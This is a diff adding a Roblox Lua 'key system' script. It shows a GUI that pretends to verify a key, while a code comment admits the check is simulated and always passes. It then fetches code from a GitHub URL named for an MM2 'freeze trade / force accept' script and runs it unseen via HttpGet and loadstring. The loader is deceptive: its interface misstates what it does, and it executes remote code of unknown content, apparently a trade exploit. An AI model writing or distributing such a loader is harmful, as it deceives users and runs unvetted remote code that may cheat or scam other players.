@@ -1,0 +1,143 @@
+-- Eclipse Productions Key System v1.0 (Auto-Validation)
+-- This script automatically validates the key passed from the loader
+
+local Library = {
+    Colors = {
+        Primary = Color3.fromRGB(255, 200, 50),
+        Secondary = Color3.fromRGB(30, 30, 40),
+        Background = Color3.fromRGB(15, 15, 20),
+        Text = Color3.fromRGB(255, 255, 255),
+        Accent = Color3.fromRGB(255, 80, 80)
+    }
+}
+
+-- Get the key from the loader
+local args = {...}
+local ValidKey = args[1] or "MM2PREMIUMKEYS1D" -- Fallback key
+
+-- Create GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "EclipseKeySystem"
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Main Frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 400, 0, 280)
+MainFrame.Position = UDim2.new(0.5, -200, 0.5, -140)
+MainFrame.BackgroundColor3 = Library.Colors.Secondary
+MainFrame.BackgroundTransparency = 0.1
+MainFrame.BorderSizePixel = 0
+MainFrame.ClipsDescendants = true
+MainFrame.Parent = ScreenGui
+
+-- Corner
+local Corner = Instance.new("UICorner")
+Corner.CornerRadius = UDim.new(0, 12)
+Corner.Parent = MainFrame
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 60)
+Title.Position = UDim2.new(0, 0, 0, 10)
+Title.BackgroundTransparency = 1
+Title.Text = "ECLIPSE PRODUCTIONS"
+Title.TextColor3 = Library.Colors.Primary
+Title.TextScaled = true
+Title.Font = Enum.Font.GothamBold
+Title.TextStrokeTransparency = 0.5
+Title.Parent = MainFrame
+
+-- Status Label (shows progress)
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, 0, 0, 40)
+Status.Position = UDim2.new(0, 0, 0, 80)
+Status.BackgroundTransparency = 1
+Status.Text = "VERIFYING KEY..."
+Status.TextColor3 = Library.Colors.Primary
+Status.TextScaled = true
+Status.Font = Enum.Font.GothamBold
+Status.Parent = MainFrame
+
+-- Loading Spinner
+local SpinnerFrame = Instance.new("Frame")
+SpinnerFrame.Size = UDim2.new(0, 50, 0, 50)
+SpinnerFrame.Position = UDim2.new(0.5, -25, 0.55, 0)
+SpinnerFrame.BackgroundColor3 = Library.Colors.Primary
+SpinnerFrame.BackgroundTransparency = 0.5
+SpinnerFrame.BorderSizePixel = 0
+SpinnerFrame.Parent = MainFrame
+
+local SpinnerCorner = Instance.new("UICorner")
+SpinnerCorner.CornerRadius = UDim.new(1, 0)
+SpinnerCorner.Parent = SpinnerFrame
+
+-- Rotate the spinner
+game:GetService("TweenService"):Create(SpinnerFrame, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true), {Rotation = 360}):Play()
+
+-- Key display (shows the key being used)
+local KeyDisplay = Instance.new("TextLabel")
+KeyDisplay.Size = UDim2.new(1, 0, 0, 30)
+KeyDisplay.Position = UDim2.new(0, 0, 0, 170)
+KeyDisplay.BackgroundTransparency = 1
+KeyDisplay.Text = "Key: " .. ValidKey
+KeyDisplay.TextColor3 = Library.Colors.Text
+KeyDisplay.TextScaled = true
+KeyDisplay.Font = Enum.Font.Gotham
+KeyDisplay.TextTransparency = 0.5
+KeyDisplay.Parent = MainFrame
+
+-- Functions
+function UpdateStatus(text, color)
+    Status.Text = text
+    if color then Status.TextColor3 = color end
+end
+
+function LoadMainScript()
+    UpdateStatus("LOADING SCRIPT...", Library.Colors.Primary)
+    
+    local success, scriptData = pcall(function()
+        return game:HttpGet("https://raw.githubusercontent.com/ArisuYT/Mm2FreezeTrade/refs/heads/main/ForceAccept")
+    end)
+    
+    if success then
+        local func, err = loadstring(scriptData)
+        if func then
+            func()
+            return true
+        else
+            warn("Failed to load script: " .. err)
+            return false
+        end
+    else
+        warn("Failed to fetch script")
+        return false
+    end
+end
+
+function ClearKeySystem()
+    ScreenGui:Destroy()
+end
+
+-- Auto-validation sequence
+task.wait(1) -- Show UI briefly
+
+UpdateStatus("KEY FOUND! VALIDATING...", Color3.fromRGB(0, 255, 0))
+task.wait(0.5)
+
+-- Simulate key validation (always valid since key is embedded)
+UpdateStatus("KEY VALIDATED! LOADING...", Color3.fromRGB(0, 255, 0))
+task.wait(0.5)
+
+-- Load the main script
+local loaded = LoadMainScript()
+
+if loaded then
+    UpdateStatus("SUCCESS! STARTING...", Color3.fromRGB(0, 255, 0))
+    task.wait(0.5)
+    ClearKeySystem()
+else
+    UpdateStatus("FAILED TO LOAD SCRIPT.", Library.Colors.Accent)
+    task.wait(2)
+    ClearKeySystem() -- Close even on failure
+end
